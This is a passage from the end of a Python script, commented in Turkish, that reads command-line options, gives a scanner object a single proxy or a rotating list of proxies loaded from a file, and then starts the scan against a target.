    parser.add_argument('-pl', '--proxy-list', help='Proxy listesi dosyası (her satırda bir proxy)')
    args = parser.parse_args()
    
    scanner = EliteScanner(args.target)
    
    # Proxy konfigürasyonu
    if args.proxy:
        scanner.session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
        print(f"{CYAN}[*] Proxy kullanılıyor: {args.proxy}{RESET}")
    
    # Proxy listesi
    if args.proxy_list:
        try:
            with open(args.proxy_list, 'r') as f:
                scanner.proxy_list = [line.strip() for line in f.readlines() if line.strip()]
                if scanner.proxy_list:
                    scanner.current_proxy = scanner.proxy_list[0]
                    scanner.session.proxies = {
                        'http': scanner.current_proxy,
                        'https': scanner.current_proxy
                    }
                    print(f"{CYAN}[*] {len(scanner.proxy_list)} proxy yüklendi. Rotasyon aktif{RESET}")
        except Exception as e:
            print(f"{RED}[!] Proxy listesi yüklenemedi: {e}{RESET}")
    
    scanner.run()
    